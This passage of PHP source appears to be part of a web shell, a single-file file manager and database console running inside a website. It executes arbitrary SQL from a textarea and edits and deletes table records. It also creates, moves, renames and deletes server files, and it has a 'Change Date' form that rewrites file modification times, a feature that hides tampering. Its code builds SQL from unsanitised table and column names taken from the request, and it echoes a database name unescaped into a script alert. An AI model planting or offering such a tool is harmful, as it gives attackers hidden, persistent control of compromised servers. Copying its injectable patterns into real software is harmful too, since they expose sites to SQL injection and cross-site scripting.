            echo '<ul class="db-sidebar-list">';
            echo '<li><a href="?db=sql&q=' . urlencode(encodePath(PATH)) . '"><i class="fa-solid fa-terminal"></i> SQL Command</a></li>';
            echo '<li><a href="?db=tables&q=' . urlencode(encodePath(PATH)) . '"><i class="fa-solid fa-table"></i> Tables</a></li>';
            echo '</ul>';
            
            // List tables in sidebar
            try {
                if (!empty($conn['name']) || $conn['type'] === 'sqlite') {
                    if ($conn['type'] === 'mysql') {
                        $stmt = $pdo->query("SHOW TABLES");
                    } elseif ($conn['type'] === 'sqlite') {
                        $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table'");
                    }
                    $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
                    
                    if (count($tables) > 0) {
                        echo '<div class="db-sidebar-heading">Tables (' . count($tables) . ')</div>';
                        echo '<ul class="db-sidebar-list">';
                        foreach ($tables as $tbl) {
                            echo '<li><a href="?db=table&tablename=' . urlencode($tbl) . '&q=' . urlencode(encodePath(PATH)) . '" title="' . htmlspecialchars($tbl) . '"><i class="fa-solid fa-table"></i> ' . htmlspecialchars($tbl) . '</a></li>';
                        }
                        echo '</ul>';
                    }
                }
            } catch (PDOException $e) {}
            
            echo '</div>';
            echo '<div class="db-manager-content">';
        } else {
            echo '<div class="db-manager-content" style="margin-left: 0;">';
        }

        if (!$is_connected) {
            // Connection Form - Dark Theme
            echo '<div style="display: flex; align-items: center; justify-content: center; min-height: calc(100vh - 100px); padding: 30px 0;">';
            echo '<div class="db-form">';
            echo '<h3 style="margin-bottom: 30px;"><i class="fa-solid fa-plug"></i> Database Connection</h3>';
            
            // Display error if exists
            if (isset($_SESSION['db_error'])) {
                echo '<div class="db-message error" style="margin-bottom: 20px;">';
                echo '<i class="fa-solid fa-exclamation-triangle"></i> Connection failed: ' . htmlspecialchars($_SESSION['db_error']);
                echo '</div>';
                unset($_SESSION['db_error']);
            }
            
            echo '<form method="post">';
            echo '<table cellspacing="0">';
            echo '<tr><th>System:</th><td><select class="db-input" name="db_type">';
            echo '<option value="mysql">MySQL / MariaDB</option>';
            echo '<option value="sqlite">SQLite 3</option>';
            echo '<option value="pgsql">PostgreSQL</option>';
            echo '</select></td></tr>';
            echo '<tr><th>Server:</th><td><input type="text" class="db-input" name="db_host" value="localhost"></td></tr>';
            echo '<tr><th>Username:</th><td><input type="text" class="db-input" name="db_user" value="root"></td></tr>';
            echo '<tr><th>Password:</th><td><input type="password" class="db-input" name="db_pass"></td></tr>';
            echo '<tr><th>Database:</th><td><input type="text" class="db-input" name="db_name" placeholder="Optional"></td></tr>';
            echo '</table>';
            echo '<div style="margin-top: 30px; padding-left: 140px;">';
            echo '<button type="submit" class="db-button db-button-primary" name="db_connect" style="padding: 10px 24px; font-size: 14px;"><i class="fa-solid fa-plug"></i> Connect</button>';
            echo '</div>';
            echo '</form>';
            echo '</div>';
            echo '</div>';
        } else {
            // Database is connected, show tabs and content
            $current_db = $_GET['db'] ?? 'overview';
            
            echo '<div class="db-manager-menu">';
            echo '<a href="?db=overview&q=' . urlencode(encodePath(PATH)) . '" class="' . ($current_db === 'overview' ? 'active' : '') . '"><i class="fa-solid fa-chart-pie"></i> Overview</a>';
            echo '<a href="?db=sql&q=' . urlencode(encodePath(PATH)) . '" class="' . ($current_db === 'sql' ? 'active' : '') . '"><i class="fa-solid fa-code"></i> SQL Query</a>';
            echo '<a href="?db=tables&q=' . urlencode(encodePath(PATH)) . '" class="' . ($current_db === 'tables' ? 'active' : '') . '"><i class="fa-solid fa-table"></i> Tables</a>';
            echo '</div>';

            // Overview Tab
            if ($current_db === 'overview') {
                
                try {
                    // Get tables with detailed information
                    if (!empty($conn['name']) || $conn['type'] === 'sqlite') {
                        if ($conn['type'] === 'mysql') {
                            $stmt = $pdo->query("SHOW TABLE STATUS");
                            $tables = $stmt->fetchAll(PDO::FETCH_ASSOC);
                        } elseif ($conn['type'] === 'sqlite') {
                            $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table'");
                            $table_names = $stmt->fetchAll(PDO::FETCH_COLUMN);
                            $tables = [];
                            foreach ($table_names as $tname) {
                                $tables[] = ['Name' => $tname];
                            }
                        }
                        
                        if (count($tables) > 0) {
                            echo '<h3 class="db-heading">Tables and views</h3>';
                            echo '<p class="db-info">Search tables in database: <input type="text" class="db-input" placeholder="Search..." style="width: 200px;"></p>';
                            
                            echo '<table class="db-table" cellspacing="0">';
                            echo '<thead><tr>';
                            echo '<th><input type="checkbox" class="db-checkbox"></th>';
                            echo '<th><a href="#">Table</a></th>';
                            echo '<th><a href="#">Engine</a></th>';
                            echo '<th><a href="#">Collation</a></th>';
                            echo '<th class="db-number"><a href="#">Data Length</a></th>';
                            echo '<th class="db-number"><a href="#">Index Length</a></th>';
                            echo '<th class="db-number"><a href="#">Data Free</a></th>';
                            echo '<th class="db-number"><a href="#">Auto Increment</a></th>';
                            echo '<th class="db-number"><a href="#">Rows</a></th>';
                            echo '<th></th>';
                            echo '</tr></thead><tbody>';
                            
                            foreach ($tables as $table) {
                                $tname = $table['Name'];
                                echo '<tr>';
                                echo '<td><input type="checkbox" class="db-checkbox"></td>';
                                echo '<td><a href="?db=table&tablename=' . urlencode($tname) . '&q=' . urlencode(encodePath(PATH)) . '" class="db-link">' . htmlspecialchars($tname) . '</a></td>';
                                echo '<td>' . htmlspecialchars($table['Engine'] ?? 'MyISAM') . '</td>';
                                echo '<td>' . htmlspecialchars($table['Collation'] ?? 'utf8mb4_unicode_520_ci') . '</td>';
                                echo '<td class="db-number">' . number_format($table['Data_length'] ?? 0) . '</td>';
                                echo '<td class="db-number">' . number_format($table['Index_length'] ?? 0) . '</td>';
                                echo '<td class="db-number">' . ($table['Data_free'] ?? 0) . '</td>';
                                echo '<td class="db-number">' . ($table['Auto_increment'] ?? '') . '</td>';
                                echo '<td class="db-number">' . number_format($table['Rows'] ?? 0) . '</td>';
                                echo '<td><a href="?db=structure&tablename=' . urlencode($tname) . '&q=' . urlencode(encodePath(PATH)) . '" class="db-link" title="Alter table">Alter</a></td>';
                                echo '</tr>';
                            }
                            
                            echo '</tbody></table>';
                            
                            echo '<div class="db-actions">';
                            echo '<p>Selected: ';
                            echo '<button class="db-button">Optimize</button> ';
                            echo '<button class="db-button">Repair</button> ';
                            echo '<button class="db-button">Empty</button> ';
                            echo '<button class="db-button">Drop</button>';
                            echo '</p></div>';
                        } else {
                            echo '<p>No tables found.</p>';
                        }
                    } else {
                        // Show database list if no database selected
                        if ($conn['type'] === 'mysql') {
                            $stmt = $pdo->query("SHOW DATABASES");
                            $databases = $stmt->fetchAll(PDO::FETCH_COLUMN);
                            
                            echo '<h3 class="db-heading">Databases</h3>';
                            echo '<table class="db-table" cellspacing="0">';
                            echo '<thead><tr><th>Database</th></tr></thead><tbody>';
                            
                            foreach ($databases as $db) {
                                echo '<tr>';
                                echo '<td><a href="?db=selectdb&dbname=' . urlencode($db) . '&q=' . urlencode(encodePath(PATH)) . '" class="db-link">' . htmlspecialchars($db) . '</a></td>';
                                echo '</tr>';
                            }
                            echo '</tbody></table>';
                        }
                    }
                } catch (PDOException $e) {
                    echo '<div class="db-message error">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
            }

            // SQL Query Tab
            elseif ($current_db === 'sql') {
                
                if (isset($_POST['execute_sql'])) {
                    $sql = $_POST['sql_query'];
                    
                    try {
                        $start_time = microtime(true);
                        $stmt = $pdo->query($sql);
                        $execution_time = round((microtime(true) - $start_time) * 1000, 2);
                        
                        // Check if it's a SELECT query
                        if ($stmt->columnCount() > 0) {
                            $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                            
                            echo '<div class="db-message success">Query executed OK, ' . count($results) . ' rows affected (' . $execution_time . ' ms)</div>';
                            
                            if (count($results) > 0) {
                                echo '<table class="db-table" cellspacing="0">';
                                echo '<thead><tr>';
                                foreach (array_keys($results[0]) as $column) {
                                    echo '<th>' . htmlspecialchars($column) . '</th>';
                                }
                                echo '</tr></thead><tbody>';
                                
                                foreach ($results as $row) {
                                    echo '<tr>';
                                    foreach ($row as $value) {
                                        echo '<td>' . htmlspecialchars($value ?? 'NULL') . '</td>';
                                    }
                                    echo '</tr>';
                                }
                                echo '</tbody></table>';
                            }
                        } else {
                            $affected = $stmt->rowCount();
                            echo '<div class="db-message success">Query executed OK, ' . $affected . ' rows affected (' . $execution_time . ' ms)</div>';
                        }
                    } catch (PDOException $e) {
                        echo '<div class="db-message error">Error in query: ' . htmlspecialchars($e->getMessage()) . '</div>';
                    }
                }
                
                echo '<form method="post" style="margin-top: 15px;">';
                echo '<p>Type: <select class="db-input"><option>SQL</option></select></p>';
                echo '<textarea class="db-sql-editor" name="sql_query">' . (isset($_POST['sql_query']) ? htmlspecialchars($_POST['sql_query']) : 'SELECT') . '</textarea>';
                echo '<p style="margin-top: 10px;">';
                echo '<button type="submit" class="adminer-button db-button-primary" name="execute_sql">Execute</button>';
                echo '</p>';
                echo '</form>';
            }

            // Tables List Tab
            elseif ($current_db === 'tables') {
                try {
                    if ($conn['type'] === 'mysql') {
                        $stmt = $pdo->query("SHOW TABLES");
                    } elseif ($conn['type'] === 'sqlite') {
                        $stmt = $pdo->query("SELECT name FROM sqlite_master WHERE type='table'");
                    } elseif ($conn['type'] === 'pgsql') {
                        $stmt = $pdo->query("SELECT tablename FROM pg_tables WHERE schemaname='public'");
                    }
                    
                    $tables = $stmt->fetchAll(PDO::FETCH_COLUMN);
                    
                    echo '<h3 class="db-heading">Database Tables (' . count($tables) . ')</h3>';
                    echo '<table class="db-table" cellspacing="0">';
                    echo '<thead><tr>';
                    echo '<th>Table Name</th>';
                    echo '<th>Actions</th>';
                    echo '</tr></thead><tbody>';
                    
                    foreach ($tables as $table) {
                        echo '<tr>';
                        echo '<td><a href="?db=table&tablename=' . urlencode($table) . '&q=' . urlencode(encodePath(PATH)) . '" class="db-link">' . htmlspecialchars($table) . '</a></td>';
                        echo '<td>';
                        echo '<a href="?db=table&tablename=' . urlencode($table) . '&q=' . urlencode(encodePath(PATH)) . '" class="db-link">Browse</a> | ';
                        echo '<a href="?db=structure&tablename=' . urlencode($table) . '&q=' . urlencode(encodePath(PATH)) . '" class="db-link">Structure</a>';
                        echo '</td>';
                        echo '</tr>';
                    }
                    
                    echo '</tbody></table>';
                } catch (PDOException $e) {
                    echo '<div class="db-message error">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
            }

            // View Table Data
            elseif ($current_db === 'table' && isset($_GET['tablename'])) {
                $table = $_GET['tablename'];
                $page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
                $per_page = 50;
                $offset = ($page - 1) * $per_page;
                
                try {
                    // Get primary key
                    $primary_key = null;
                    if ($conn['type'] === 'mysql') {
                        $pk_stmt = $pdo->query("SHOW KEYS FROM `$table` WHERE Key_name = 'PRIMARY'");
                        $pk_result = $pk_stmt->fetch(PDO::FETCH_ASSOC);
                        if ($pk_result) {
                            $primary_key = $pk_result['Column_name'];
                        }
                    } elseif ($conn['type'] === 'sqlite') {
                        $pk_stmt = $pdo->query("PRAGMA table_info(`$table`)");
                        $columns = $pk_stmt->fetchAll(PDO::FETCH_ASSOC);
                        foreach ($columns as $col) {
                            if ($col['pk'] == 1) {
                                $primary_key = $col['name'];
                                break;
                            }
                        }
                    }
                    
                    // Get total count
                    $count_stmt = $pdo->query("SELECT COUNT(*) FROM `$table`");
                    $total_rows = $count_stmt->fetchColumn();
                    $total_pages = ceil($total_rows / $per_page);
                    
                    // Get data
                    $stmt = $pdo->query("SELECT * FROM `$table` LIMIT $per_page OFFSET $offset");
                    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    
                    echo '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">';
                    echo '<h3 class="db-heading"><i class="fa-solid fa-table"></i> Table: ' . htmlspecialchars($table) . '</h3>';
                    echo '<a href="?db=insert&tablename=' . urlencode($table) . '&q=' . urlencode(encodePath($current_path)) . '" class="db-button db-button-primary">';
                    echo '<i class="fa-solid fa-plus"></i> Insert New Record</a>';
                    echo '</div>';
                    
                    if (count($results) > 0) {
                        // Info bar
                        echo '<div class="db-info" style="margin-bottom: 10px;">';
                        echo 'Showing ' . ($offset + 1) . '-' . min($offset + $per_page, $total_rows) . ' of ' . number_format($total_rows) . ' rows';
                        echo '</div>';
                        
                        // Table
                        echo '<div style="overflow-x: auto; margin-bottom: 20px;">';
                        echo '<table class="db-table" cellspacing="0">';
                        echo '<thead><tr>';
                        foreach (array_keys($results[0]) as $column) {
                            echo '<th>' . htmlspecialchars($column) . '</th>';
                        }
                        echo '<th style="width: 130px; text-align: center;">Actions</th>';
                        echo '</tr></thead><tbody>';
                        
                        foreach ($results as $row) {
                            echo '<tr>';
                            foreach ($row as $key => $value) {
                                $display_value = htmlspecialchars($value ?? 'NULL');
                                // Truncate but show in tooltip
                                if (strlen($display_value) > 80) {
                                    $short = substr($display_value, 0, 80) . '...';
                                    echo '<td><div class="db-table-cell-wrap" title="' . $display_value . '">' . $short . '</div></td>';
                                } else {
                                    echo '<td><div class="db-table-cell-wrap">' . $display_value . '</div></td>';
                                }
                            }
                            echo '<td style="text-align: center; white-space: nowrap;">';
                            if ($primary_key && isset($row[$primary_key])) {
                                echo '<a href="?db=edit&tablename=' . urlencode($table) . '&pk=' . urlencode($primary_key) . '&id=' . urlencode($row[$primary_key]) . '&q=' . urlencode(encodePath($current_path)) . '" class="db-action-btn db-action-edit" title="Edit">';
                                echo '<i class="fa-solid fa-pen"></i></a> ';
                                echo '<a href="?db=delete&tablename=' . urlencode($table) . '&pk=' . urlencode($primary_key) . '&id=' . urlencode($row[$primary_key]) . '&q=' . urlencode(encodePath($current_path)) . '" class="db-action-btn db-action-delete" onclick="return confirm(\'Delete this record?\')" title="Delete">';
                                echo '<i class="fa-solid fa-trash"></i></a>';
                            } else {
                                echo '<span style="color: #6b7280; font-size: 11px;">No PK</span>';
                            }
                            echo '</td>';
                            echo '</tr>';
                        }
                        echo '</tbody></table>';
                        echo '</div>';
                        
                        // Pagination
                        if ($total_pages > 1) {
                            echo '<div style="display: flex; gap: 10px; align-items: center; margin-top: 15px;">';
                            if ($page > 1) {
                                echo '<a href="?db=table&tablename=' . urlencode($table) . '&page=' . ($page - 1) . '&q=' . urlencode(encodePath($current_path)) . '" class="db-button">';
                                echo '<i class="fa-solid fa-chevron-left"></i> Previous</a>';
                            }
                            echo '<span style="color: #9ca3af;">Page ' . $page . ' of ' . $total_pages . '</span>';
                            if ($page < $total_pages) {
                                echo '<a href="?db=table&tablename=' . urlencode($table) . '&page=' . ($page + 1) . '&q=' . urlencode(encodePath($current_path)) . '" class="db-button">';
                                echo 'Next <i class="fa-solid fa-chevron-right"></i></a>';
                            }
                            echo '</div>';
                        }
                    } else {
                        echo '<div class="db-info">No records found in this table.</div>';
                    }
                } catch (PDOException $e) {
                    echo '<div class="db-message error">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
            }
            
            // Edit Record
            elseif ($current_db === 'edit' && isset($_GET['tablename']) && isset($_GET['id'])) {
                $table = $_GET['tablename'];
                $pk = $_GET['pk'];
                $id = $_GET['id'];
                
                try {
                    // Handle form submission
                    if (isset($_POST['update_record'])) {
                        $updates = [];
                        $params = [];
                        
                        foreach ($_POST as $key => $value) {
                            if ($key !== 'update_record') {
                                $updates[] = "`$key` = ?";
                                $params[] = $value;
                            }
                        }
                        
                        $params[] = $id;
                        $sql = "UPDATE `$table` SET " . implode(', ', $updates) . " WHERE `$pk` = ?";
                        
                        $stmt = $pdo->prepare($sql);
                        $stmt->execute($params);
                        
                        echo "<script>alert('Record updated successfully!'); window.location.replace('?db=table&tablename=" . urlencode($table) . "&q=" . urlencode(encodePath(PATH)) . "');</script>";
                    }
                    
                    // Get current record
                    $stmt = $pdo->prepare("SELECT * FROM `$table` WHERE `$pk` = ?");
                    $stmt->execute([$id]);
                    $record = $stmt->fetch(PDO::FETCH_ASSOC);
                    
                    if (!$record) {
                        echo '<div class="alert alert-danger">Record not found!</div>';
                    } else {
                        echo '<h6>Edit Record in Table: ' . htmlspecialchars($table) . '</h6>';
                        echo '<form method="post">';
                        echo '<div class="row">';
                        
                        foreach ($record as $column => $value) {
                            echo '<div class="col-md-6 mb-3">';
                            echo '<label class="form-label">' . htmlspecialchars($column) . ':</label>';
                            
                            // Check if it's a text field (long content)
                            if (strlen($value) > 100) {
                                echo '<textarea class="form-control" name="' . htmlspecialchars($column) . '" rows="4">' . htmlspecialchars($value) . '</textarea>';
                            } else {
                                // Disable primary key field
                                $disabled = ($column === $pk) ? 'readonly' : '';
                                echo '<input type="text" class="form-control" name="' . htmlspecialchars($column) . '" value="' . htmlspecialchars($value ?? '') . '" ' . $disabled . '>';
                            }
                            echo '</div>';
                        }
                        
                        echo '</div>';
                        echo '<div class="mt-3">';
                        echo '<button type="submit" class="btn btn-success" name="update_record"><i class="fa-solid fa-save"></i> Update Record</button>';
                        echo '<a href="?db=table&tablename=' . urlencode($table) . '&q=' . urlencode(encodePath(PATH)) . '" class="btn btn-secondary ms-2">Cancel</a>';
                        echo '</div>';
                        echo '</form>';
                    }
                } catch (PDOException $e) {
                    echo '<div class="alert alert-danger">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
            }
            
            // Insert Record
            elseif ($current_db === 'insert' && isset($_GET['tablename'])) {
                $table = $_GET['tablename'];
                
                try {
                    // Handle form submission
                    if (isset($_POST['insert_record'])) {
                        $columns = [];
                        $values = [];
                        $params = [];
                        
                        foreach ($_POST as $key => $value) {
                            if ($key !== 'insert_record' && $value !== '') {
                                $columns[] = "`$key`";
                                $values[] = "?";
                                $params[] = $value;
                            }
                        }
                        
                        if (count($columns) > 0) {
                            $sql = "INSERT INTO `$table` (" . implode(', ', $columns) . ") VALUES (" . implode(', ', $values) . ")";
                            
                            $stmt = $pdo->prepare($sql);
                            $stmt->execute($params);
                            
                            echo "<script>alert('Record inserted successfully!'); window.location.replace('?db=table&tablename=" . urlencode($table) . "&q=" . urlencode(encodePath(PATH)) . "');</script>";
                        }
                    }
                    
                    // Get table structure
                    if ($conn['type'] === 'mysql') {
                        $stmt = $pdo->query("DESCRIBE `$table`");
                        $columns = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    } elseif ($conn['type'] === 'sqlite') {
                        $stmt = $pdo->query("PRAGMA table_info(`$table`)");
                        $columns = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    }
                    
                    echo '<h6>Insert New Record into Table: ' . htmlspecialchars($table) . '</h6>';
                    echo '<form method="post">';
                    echo '<div class="row">';
                    
                    foreach ($columns as $column) {
                        $col_name = $conn['type'] === 'mysql' ? $column['Field'] : $column['name'];
                        $col_type = $conn['type'] === 'mysql' ? $column['Type'] : $column['type'];
                        $is_auto = ($conn['type'] === 'mysql' && strpos($column['Extra'], 'auto_increment') !== false) ||
                                   ($conn['type'] === 'sqlite' && $column['pk'] == 1);
                        
                        echo '<div class="col-md-6 mb-3">';
                        echo '<label class="form-label">' . htmlspecialchars($col_name) . ' <small>(' . htmlspecialchars($col_type) . ')</small>:</label>';
                        
                        if ($is_auto) {
                            echo '<input type="text" class="form-control" placeholder="Auto-generated" disabled>';
                        } else {
                            // Determine input type based on column type
                            if (strpos(strtolower($col_type), 'text') !== false || strpos(strtolower($col_type), 'blob') !== false) {
                                echo '<textarea class="form-control" name="' . htmlspecialchars($col_name) . '" rows="3"></textarea>';
                            } elseif (strpos(strtolower($col_type), 'int') !== false) {
                                echo '<input type="number" class="form-control" name="' . htmlspecialchars($col_name) . '">';
                            } elseif (strpos(strtolower($col_type), 'date') !== false) {
                                echo '<input type="datetime-local" class="form-control" name="' . htmlspecialchars($col_name) . '">';
                            } else {
                                echo '<input type="text" class="form-control" name="' . htmlspecialchars($col_name) . '">';
                            }
                        }
                        echo '</div>';
                    }
                    
                    echo '</div>';
                    echo '<div class="mt-3">';
                    echo '<button type="submit" class="btn btn-success" name="insert_record"><i class="fa-solid fa-plus"></i> Insert Record</button>';
                    echo '<a href="?db=table&tablename=' . urlencode($table) . '&q=' . urlencode(encodePath(PATH)) . '" class="btn btn-secondary ms-2">Cancel</a>';
                    echo '</div>';
                    echo '</form>';
                } catch (PDOException $e) {
                    echo '<div class="alert alert-danger">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
            }
            
            // Delete Record
            elseif ($current_db === 'delete' && isset($_GET['tablename']) && isset($_GET['id'])) {
                $table = $_GET['tablename'];
                $pk = $_GET['pk'];
                $id = $_GET['id'];
                
                try {
                    $stmt = $pdo->prepare("DELETE FROM `$table` WHERE `$pk` = ?");
                    $stmt->execute([$id]);
                    
                    echo "<script>alert('Record deleted successfully!'); window.location.replace('?db=table&tablename=" . urlencode($table) . "&q=" . urlencode(encodePath(PATH)) . "');</script>";
                } catch (PDOException $e) {
                    echo '<div class="alert alert-danger">Error deleting record: ' . htmlspecialchars($e->getMessage()) . '</div>';
                    echo '<a href="?db=table&tablename=' . urlencode($table) . '&q=' . urlencode(encodePath(PATH)) . '" class="btn btn-secondary">Back to Table</a>';
                }
            }

            // View Table Structure
            elseif ($current_db === 'structure' && isset($_GET['tablename'])) {
                $table = $_GET['tablename'];
                
                try {
                    if ($conn['type'] === 'mysql') {
                        $stmt = $pdo->query("DESCRIBE `$table`");
                    } elseif ($conn['type'] === 'sqlite') {
                        $stmt = $pdo->query("PRAGMA table_info(`$table`)");
                    } elseif ($conn['type'] === 'pgsql') {
                        $stmt = $pdo->query("SELECT column_name, data_type, is_nullable FROM information_schema.columns WHERE table_name = '$table'");
                    }
                    
                    $columns = $stmt->fetchAll(PDO::FETCH_ASSOC);
                    
                    echo '<h6>Table Structure: ' . htmlspecialchars($table) . '</h6>';
                    echo '<table class="table table-hover">';
                    echo '<thead><tr>';
                    foreach (array_keys($columns[0]) as $col) {
                        echo '<th>' . htmlspecialchars($col) . '</th>';
                    }
                    echo '</tr></thead><tbody>';
                    
                    foreach ($columns as $column) {
                        echo '<tr>';
                        foreach ($column as $value) {
                            echo '<td>' . htmlspecialchars($value ?? 'NULL') . '</td>';
                        }
                        echo '</tr>';
                    }
                    echo '</tbody></table>';
                } catch (PDOException $e) {
                    echo '<div class="alert alert-danger">Error: ' . htmlspecialchars($e->getMessage()) . '</div>';
                }
            }

            // Select Database
            elseif ($current_db === 'selectdb' && isset($_GET['dbname'])) {
                $dbname = $_GET['dbname'];
                $_SESSION['db_connection']['name'] = $dbname;
                echo "<script>alert('Switched to database: $dbname'); window.location.replace('?db=overview&q=" . urlencode(encodePath(PATH)) . "');</script>";
            }
        }

        echo '</div>'; // Close db-manager-content
        echo '</div>'; // Close db-manager-container
    }

    // New File Form
    if (isset($_GET['newfile'])) {
        echo '
    <div class="form-section">
        <h5><i class="fa-solid fa-file-circle-plus"></i> Create New File</h5>
        <form method="post">
            <div class="mb-3">
                <label class="form-label">File Name:</label>
                <input type="text" class="form-control" name="new_filename" placeholder="example.txt" required>
            </div>
            <div class="mb-3">
                <label class="form-label">Content (optional):</label>
                <textarea class="form-control" name="new_file_content" rows="5" placeholder="Enter file content..."></textarea>
            </div>
            <button type="submit" class="btn btn-dark" name="create_file"><i class="fa-solid fa-plus"></i> Create File</button>
            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';
    }

    // New Folder Form
    if (isset($_GET['newfolder'])) {
        echo '
    <div class="form-section">
        <h5><i class="fa-solid fa-folder-plus"></i> Create New Folder</h5>
        <form method="post">
            <div class="mb-3">
                <label class="form-label">Folder Name:</label>
                <input type="text" class="form-control" name="new_foldername" placeholder="new-folder" required>
            </div>
            <button type="submit" class="btn btn-dark" name="create_folder"><i class="fa-solid fa-plus"></i> Create Folder</button>
            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';
    }

    // Change Date Form
    if (isset($_GET['t']) && isset($_GET['q'])) {
        $targetFile = PATH . "/" . $_GET['t'];
        if (file_exists($targetFile)) {
            $currentDate = date('Y-m-d\TH:i', filemtime($targetFile));
            echo '
    <div class="form-section">
        <h5><i class="fa-solid fa-calendar-alt"></i> Change Date/Time for: ' . htmlspecialchars($_GET['t']) . '</h5>
        <form method="post">
            <div class="mb-3">
                <label class="form-label">New Date/Time:</label>
                <input type="datetime-local" class="form-control" name="new_datetime" value="' . $currentDate . '" required>
            </div>
            <button type="submit" class="btn btn-dark" name="change_date"><i class="fa-solid fa-save"></i> Change Date</button>
            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';
        }
    }

    // Move File/Folder Form
    if (isset($_GET['m']) && isset($_GET['q'])) {
        $itemToMove = PATH . "/" . $_GET['m'];
        if (file_exists($itemToMove)) {
            echo '
    <div class="form-section">
        <h5><i class="fa-solid fa-arrows-alt"></i> Move: ' . htmlspecialchars($_GET['m']) . '</h5>
        <p style="color: #a0a0a0;">Current location: ' . htmlspecialchars(PATH) . '</p>
        <form method="post">
            <div class="mb-3">
                <label class="form-label">Destination Folder (full path):</label>
                <input type="text" class="form-control" name="move_destination" placeholder="/var/www/html/newfolder" value="' . htmlspecialchars(PATH) . '" required>
            </div>
            <button type="submit" class="btn btn-dark" name="move_item"><i class="fa-solid fa-arrows-alt"></i> Move</button>
            <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary">Cancel</a>
        </form>
    </div>';
        }
    }

    if (isset($_GET['p'])) {

        //fetch files
        if (is_readable(PATH)) {
            $fetch_obj = scandir(PATH);
            $folders = array();
            $files = array();
            foreach ($fetch_obj as $obj) {
                if ($obj == '.' || $obj == '..') {
                    continue;
                }
                $new_obj = PATH . '/' . $obj;
                if (is_dir($new_obj)) {
                    array_push($folders, $obj);
                } elseif (is_file($new_obj)) {
                    array_push($files, $obj);
                }
            }
        }

        // Bulk Actions Bar
        echo '
<form method="post" id="bulkForm">
<div class="bulk-actions" id="bulkActions">
    <span class="selected-count"><span id="selectedCount">0</span> item(s) selected</span>
    <button type="submit" name="bulk_delete" class="btn btn-danger btn-sm" onclick="return confirm(\'Are you sure you want to delete selected items?\')">
        <i class="fa-solid fa-trash"></i> Delete Selected
    </button>
    <button type="button" class="btn btn-primary btn-sm" onclick="showBulkMoveInput()">
        <i class="fa-solid fa-arrows-alt"></i> Move Selected
    </button>
    <button type="button" class="btn btn-secondary btn-sm" onclick="deselectAll()">
        <i class="fa-solid fa-xmark"></i> Cancel
    </button>
</div>
<div class="bulk-actions" id="bulkMoveInput" style="display:none;">
    <input type="text" class="form-control form-control-sm" name="bulk_move_destination" placeholder="Destination folder path (e.g. /var/www/html/folder)" style="width: 400px;">
    <button type="submit" name="bulk_move" class="btn btn-primary btn-sm">
        <i class="fa-solid fa-check"></i> Confirm Move
    </button>
    <button type="button" class="btn btn-secondary btn-sm" onclick="hideBulkMoveInput()">
        <i class="fa-solid fa-xmark"></i> Cancel
    </button>
</div>
';

        echo '
<table class="table table-hover">
  <thead>
    <tr>
      <th scope="col" style="width: 40px;"><input type="checkbox" id="selectAll" onclick="toggleSelectAll()" title="Select All"></th>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
        foreach ($folders as $folder) {
            echo "    <tr>
      <td><input type='checkbox' class='bulk-checkbox' name='selected_items[]' value='" . htmlspecialchars($folder) . "' onchange='updateBulkActions()'></td>
      <td><i class='fa-solid fa-folder'></i> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . htmlspecialchars($folder) . "</a></td>
      <td><b>---</b></td>
      <td>". date("F d Y H:i:s", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</td>
      <td class='action-icons'>
      <a title='Move' href='?q=" . urlencode(encodePath(PATH)) . "&m=" . urlencode($folder) . "'><i class='fa-solid fa-arrows-alt'></i></a>
      <a title='Change Date' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . urlencode($folder) . "'><i class='fa-solid fa-calendar-alt'></i></a>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($folder) . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . urlencode($folder) . "' onclick=\"return confirm('Delete this folder?')\"><i class='fa fa-trash' aria-hidden='true'></i></a>
      </td>
    </tr>
";
        }
        foreach ($files as $file) {
            echo "    <tr>
          <td><input type='checkbox' class='bulk-checkbox' name='selected_items[]' value='" . htmlspecialchars($file) . "' onchange='updateBulkActions()'></td>
          <td>" . fileIcon($file) . htmlspecialchars($file) . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s", filemtime(PATH . "/" . $file)) . "</td>
          <td>0". substr(decoct(fileperms(PATH . "/" .$file)), -3) . "</td>
          <td class='action-icons'>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . urlencode($file) . "'><i class='fa-solid fa-file-pen'></i></a>
          <a title='Move' href='?q=" . urlencode(encodePath(PATH)) . "&m=" . urlencode($file) . "'><i class='fa-solid fa-arrows-alt'></i></a>
          <a title='Change Date' href='?q=" . urlencode(encodePath(PATH)) . "&t=" . urlencode($file) . "'><i class='fa-solid fa-calendar-alt'></i></a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . urlencode($file) . "'><i class='fa-sharp fa-regular fa-pen-to-square'></i></a>
